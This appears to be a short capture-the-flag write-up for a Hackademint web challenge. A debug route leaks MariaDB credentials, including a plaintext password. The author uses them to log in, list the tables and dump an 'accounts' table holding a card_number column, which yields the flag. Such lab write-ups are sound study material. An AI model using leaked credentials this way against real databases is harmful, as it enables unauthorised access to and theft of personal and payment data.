https://relais-colis.dev.hackademint.org/db_test_route/

![[Pasted image 20240906215139.png]]

```
HOST	
'challenges.hackademint.org'
PASSWORD	
'Dbpass123!'
PORT	
'32306'
USER	
'scott'
request	
<WSGIRequest: GET '/db_test_route/'>
```

```plaintext
mysql -h challenges.hackademint.org -P 32306 -u scott -p

Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 65
Server version: 11.5.2-MariaDB-ubu2404 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| accounts           |
| information_schema |
+--------------------+
2 rows in set (0.011 sec)

MariaDB [(none)]> USE accounts;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [accounts]> SHOW TABLES;
+--------------------+
| Tables_in_accounts |
+--------------------+
| accounts           |
+--------------------+
1 row in set (0.012 sec)

MariaDB [accounts]> DESCRIBE accounts;
+-------------+--------------+------+-----+---------+----------------+
| Field       | Type         | Null | Key | Default | Extra          |
+-------------+--------------+------+-----+---------+----------------+
| id          | int(11)      | NO   | PRI | NULL    | auto_increment |
| first_name  | varchar(100) | NO   |     | NULL    |                |
| last_name   | varchar(100) | NO   |     | NULL    |                |
| card_number | varchar(100) | NO   |     | NULL    |                |
+-------------+--------------+------+-----+---------+----------------+
4 rows in set (0.020 sec)

MariaDB [accounts]> SELECT * FROM accounts;
+----+------------+-----------+-----------------------------------+
| id | first_name | last_name | card_number                       |
+----+------------+-----------+-----------------------------------+
|  1 | Test       | Test      | Star{s0meth1ng_f1shy_is_go1ng_on} |
+----+------------+-----------+-----------------------------------+
1 row in set (0.012 sec)
```